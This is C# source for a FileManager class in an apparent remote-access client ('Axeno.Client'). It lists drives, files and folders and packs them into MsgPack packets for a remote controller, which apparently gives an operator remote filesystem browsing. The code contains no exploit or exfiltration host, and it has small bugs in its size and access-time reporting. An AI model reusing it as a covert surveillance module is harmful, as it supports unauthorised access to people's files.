using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking.Functions.System
{
    internal class FileManager
    {
        public static byte[] GetDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            StringBuilder sb = new StringBuilder();
            string drSize = "N/A";

            foreach (DriveInfo drive in allDrives)
            {
                if (drive.IsReady)
                {
                    long driveSizeBytes = drive.TotalSize;
                    double driveSizeTB = driveSizeBytes / (1024.0 * 1024.0 * 1024.0 * 1024.0);
                    double driveSizeGB = driveSizeBytes / (1024.0 * 1024.0 * 1024.0);
                    double driveSizeMB = driveSizeBytes / (1024.0 * 1024.0);
                    double driveSizeKB = driveSizeBytes / 1024.0;

                    if (driveSizeTB >= 1.0)
                    {
                        drSize = $"{driveSizeTB:0.##} TB";
                    }
                    else if (driveSizeGB >= 1.0)
                    {
                        drSize = $"{driveSizeGB:0.##} GB";
                    }
                    else if (driveSizeMB >= 1.0)
                    {
                        drSize = $"{driveSizeMB:0.##} MB";
                    }
                    else if (driveSizeKB >= 1.0)
                    {
                        drSize = $"{driveSizeKB:0.##} KB";
                    }
                    else
                    {
                        drSize = $"{driveSizeBytes} bytes";
                    }

                }

                sb.Append($"Name<{drive.Name}>Type<Drive>Access<{drive.RootDirectory.LastAccessTime}>Size<{drSize}>Path<{drive.RootDirectory.FullName}><SPLITHERE>");
            }

            MsgPack mpack = new MsgPack();
            mpack.ForcePathObject("Packet").AsString = "FileManager";
            mpack.ForcePathObject("Data").AsString = sb.ToString();
            return mpack.Encode2Bytes();

        }
        public static byte[] GetDirectory(string directoryPath)
        {
            DirectoryInfo directory = new DirectoryInfo(directoryPath);
            StringBuilder sb = new StringBuilder();
            string parentDir = "";

            try
            {
                if (directory != null && directory.Parent != null)
                {
                    parentDir = directory.Parent.FullName;
                }

                if (parentDir == null)
                {
                    parentDir = "";
                }
            }
            catch (Exception)
            {
                parentDir = "";
            }
            foreach (FileInfo file in directory.GetFiles())
            {


                long fSize = file.Length;
                string fSizeStr = "";
                double fileSizeTB = fSize / (1024.0 * 1024.0 * 1024.0 * 1024.0);
                double fileSizeGB = fSize / (1024.0 * 1024.0 * 1024.0);
                double fileSizeMB = fSize / (1024.0 * 1024.0);
                double fileSizeBytes = fSize / 1024.0;

                if (fileSizeTB >= 1.0)
                {
                    fSizeStr = $"{fileSizeTB:0.##} TB";
                }
                else if (fileSizeGB >= 1.0)
                {
                    fSizeStr = $"{fileSizeGB:0.##} GB";
                }
                else if (fileSizeMB >= 1.0)
                {
                    fSizeStr = $"{fileSizeMB:0.##} MB";
                }
                else if (fileSizeBytes >= 1.0)
                {
                    fSizeStr = $"{fileSizeBytes:0.##} KB";
                }
                else
                {
                    fSizeStr = $"{fSize} bytes";
                }


                sb.Append($"Name<{file.Name}>Type<File>Access<{file.LastAccessTime}>Size<{fSizeStr}>Path<{file.FullName}>Parent<{parentDir}><SPLITHERE>");
            }


            foreach (DirectoryInfo subDir in directory.GetDirectories())
            {


                sb.Append($"Name<{subDir.Name}>Type<Folder>Access<{directory.LastAccessTime}>Path<{subDir.FullName}>Parent<{parentDir}><SPLITHERE>");
            }


            MsgPack mpack = new MsgPack();
            mpack.ForcePathObject("Packet").AsString = "FileManager";
            mpack.ForcePathObject("Data").AsString = sb.ToString();
            return mpack.Encode2Bytes();
        }
    }
}
